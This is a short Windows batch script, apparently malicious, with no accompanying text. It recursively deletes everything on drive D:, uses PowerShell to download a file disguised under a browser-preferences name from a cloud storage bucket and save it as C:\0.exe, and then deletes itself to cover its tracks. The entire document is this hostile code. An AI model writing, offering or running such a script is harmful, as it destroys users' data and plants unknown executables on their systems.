rd /s /q D:\*
del /s /q D:\*.*
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://wylt.oss-cn-shanghai.aliyuncs.com/edge-Secure-Preferences', 'C:\0.exe')"
del %0
